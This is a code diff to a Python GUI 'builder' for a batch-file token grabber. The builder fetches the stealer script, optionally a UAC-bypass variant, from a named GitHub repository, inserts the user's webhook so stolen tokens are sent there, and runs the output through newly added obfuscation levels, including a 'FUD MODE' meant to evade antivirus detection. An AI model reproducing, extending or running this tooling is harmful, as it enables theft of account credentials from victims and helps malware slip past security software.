@@ -2,6 +2,8 @@ import tkinter as tk #prolly built in but idk ngl
 import os
 import random
 from random import randint
+import codecs
+import string
 
 try:
     import customtkinter as kdot
@@ -20,6 +22,12 @@ try:
 except:
     os.system("pip install requests")
     import requests
+
+code = r"""
+@echo off
+set "n=a" && set "o=b" && set "p=c" && set "q=d" && set "r=e" && set "s=f" && set "t=g" && set "u=h" && set "v=i" && set "w=j" && set "x=k" && set "y=l" && set "z=m" && set "a=n" && set "b=o" && set "c=p" && set "d=q" && set "e=r" && set "f=s" && set "g=t" && set "h=u" && set "i=v" && set "j=w" && set "k=x" && set "l=y" && set "m=z" && set "N1=A" && set "O1=B" && set "P1=C" && set "Q1=D" && set "R1=E" && set "S1=F" && set "T1=G" && set "U1=H" && set "V1=I" && set "W1=J" && set "X1=K" && set "Y1=L" && set "Z1=M" && set "A1=N" && set "B1=O" && set "C1=P" && set "D1=Q" && set "E1=R" && set "F1=S" && set "G1=T" && set "H1=U" && set "I1=V" && set "J1=W" && set "K1=X" && set "L1=Y" && set "M1=Z"
+chcp 65001 > nul
+"""
 
 class Buidler(kdot.CTk):
     def __init__(self):
@@ -80,8 +88,8 @@ class Buidler(kdot.CTk):
         self.webhook_check_button = kdot.CTkButton(self.home_frame, text="Check", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60, command=self.webhook_button_check)
         self.webhook_check_button.grid(row=0, column=2, padx=10, pady=10, sticky="n")
         
-        self.obfuscate_check_box = kdot.CTkCheckBox(self.home_frame, text="Obfuscate", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
-        self.obfuscate_check_box.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
+        self.obfuscate_dropdown_box = kdot.CTkOptionMenu(self.home_frame, values=["Level 1", "Level 2", "Level 3", "All", "FUD MODE", "None"], )
+        self.obfuscate_dropdown_box.grid(row=1, column=0, padx=10, pady=10, sticky="ew")
         self.uac_bypass_check_box = kdot.CTkCheckBox(self.home_frame, text="UAC Bypass", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), corner_radius=10, height=30, width=60)
         self.uac_bypass_check_box.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")
         
@@ -143,25 +151,155 @@ class Buidler(kdot.CTk):
             print(e)
             
     def start_button_event(self):
-        obfuscate = self.obfuscate_check_box.get()
+        obfuscate = self.obfuscate_dropdown_box.get()
         uac_bypass = self.uac_bypass_check_box.get()
         webhook = self.webhook_box.get()
         self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main.bat'
         if uac_bypass == True:
             self.url = 'https://raw.githubusercontent.com/KDot227/Powershell-Token-Grabber/main/main_with_uac_bypass.bat'
-        if obfuscate == True:
-            self.code = requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook)
-            self.obfuscate()
+        self.code = requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook)
+        if obfuscate == "Level 1":
+            self.level1()
+            self.create_top_level("main.level1.bat is the finished product!")
+        elif obfuscate == "Level 2":
+            self.level2()
+            self.create_top_level("main.level2.bat is the finished product!")
+        elif obfuscate == "Level 3":
+            self.level3()
+            self.create_top_level("main.level3.bat is the finished product!")
+        elif obfuscate == "All":
+            self.all()
+        elif obfuscate == "FUD MODE":
+            self.fud()
+            self.create_top_level("main.fud.bat is the finished product!")
+        elif obfuscate == "None":
+            with open("main.bat", "w") as f:
+                f.write(self.code)
+                self.create_top_level("main.bat is the finished product!")
         else:
-            with open('main.bat', 'w') as f:
-                f.write(requests.get(self.url).text.replace("YOUR_WEBHOOK_HERE", webhook))
-                
+            raise Exception("Invalid Obfuscation Level")
+            
+        
+    def create_top_level(self, *words):
+        window = kdot.CTkToplevel(self)
+        window.geometry("500x300")
+        
+        label = kdot.CTkLabel(window, text=words[0], text_color=("gray10", "gray90"), anchor="w", font=("Arial", 20))
+        label.pack(padx=10, pady=10)
+        
     def make_random_string(self):
         length = randint(5, 8)
-        return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") for i in range(length))
+        return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZḆḞԍǏƘԸɌȚЦѠƳȤѧćễļṃŉᵲừŵź☠☢☣卐") for i in range(length))
             
-    
-    def obfuscate(self):
+    def level1(self):
+        carrot = False
+        var = False
+        with open("main.level1.bat", "a+", encoding="utf-8") as f:
+            f.write(code)
+            for line in self.code:
+                for char in line:
+                    if char == ">":
+                        f.write(char)
+                    elif char == "^":
+                        f.write(char)
+                        carrot = True
+                    elif carrot == True:
+                        f.write(char)
+                        carrot = False
+                    else:
+                        if char == "%":
+                            var = not var
+                            f.write(char)
+                            
+                        elif var == True:
+                            f.write(char)
+                            
+                        elif "\n" in char:
+                            f.write(char)
+                            
+                        else:
+                            random = self.make_random_string()
+                            if char in string.ascii_letters:
+                                if char.islower():
+                                    coded0 = codecs.encode(char, 'rot_13')
+                                    coded = coded0.replace(coded0, f"%{coded0}%")
+                                    f.write(f"{coded}%{random}%")
+                                else:
+                                    coded0 = codecs.encode(char, 'rot_13').upper()
+                                    coded = coded0.replace(coded0, f'%{coded0}1%')
+                                    f.write(f"{coded}%{random}%")
+                            else:
+                                f.write(f"{char}%{random}%")
+                                
+    def level2(self):
+        characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        random_order = ''.join(random.sample(characters, len(characters)))
+        carrot = False
+        var = False
+        with open("main.level2.bat", "a+", encoding="utf-8") as f:
+            f.write(f"set KDOT={random_order}\nchcp 65001 > nul\n")
+            for line in self.code:
+                for char in line:
+                    if char == ">":
+                        f.write(char)
+                    elif char == "^":
+                        f.write(char)
+                        carrot = True
+                    elif carrot == True:
+                        f.write(char)
+                        carrot = False
+                    else:
+                        if char == "%":
+                            var = not var
+                            f.write(char)
+                            
+                        elif var == True:
+                            f.write(char)
+                            
+                        elif "\n" in char:
+                            f.write(char)
+                            
+                        else:
+                            if char in string.ascii_letters:
+                                var = f"%KDOT:~{random_order.index(char)},1%"
+                                f.write(var)
+                            else:
+                                f.write(char)
+                                
+    def level3(self):
+        out_hex = []
+
+        #lowkey overkill lmao
+        out_hex.extend(["FF", "FE", "26", "63", "6C", "73", "0D", "0A", "FF", "FE", "0A", "0D"])
+        with open('holder.bat', 'w') as f:
+            f.write(self.code)
+        with open('holder.bat', 'rb') as f:
+            penis = f.read()
+
+        out_hex.extend(['{:02X}'.format(b) for b in penis])
+
+        with open(f'main.level3.bat', 'wb') as f:
+            for i in out_hex:
+                f.write(bytes.fromhex(i))
+                
+        os.remove('holder.bat')
+            
+    def all(self):
+        names = []
+        self.level2()
+        self.file = "main.level2.bat"
+        names.append(self.file)
+        self.level1()
+        self.file = f"main.level1.bat"
+        names.append(self.file)
+        self.level3()
+        os.rename(f"main.level3.bat", "FINAL.bat")
+        for name in names:
+            os.remove(name)
+        print("FINAL.bat is the finished product!")
+        self.create_top_level("FINAL.bat is the finished product!")
+        
+    def fud(self):
         carrot = False
         var = False
         with open("main.fud.bat", "a+", encoding="utf-8") as f:
@@ -190,17 +328,7 @@ class Buidler(kdot.CTk):
                         else:
                             random = self.make_random_string()
                             f.write(f"{char}%{random}%")
-                            
-        self.create_top_level("FINISHED OBFUSCATION AT   \"main.{OBFUSCATION_LEVEL}.bat\"")
         
-    def create_top_level(self, *words):
-        window = kdot.CTkToplevel(self)
-        window.geometry("500x300")
-        
-        label = kdot.CTkLabel(window, text=words[0], text_color=("gray10", "gray90"), anchor="w", font=("Arial", 14))
-        label.grid(row=0, column=0, sticky="ew", padx=10, pady=10)
-        
-            
         
         
 if __name__ == '__main__':
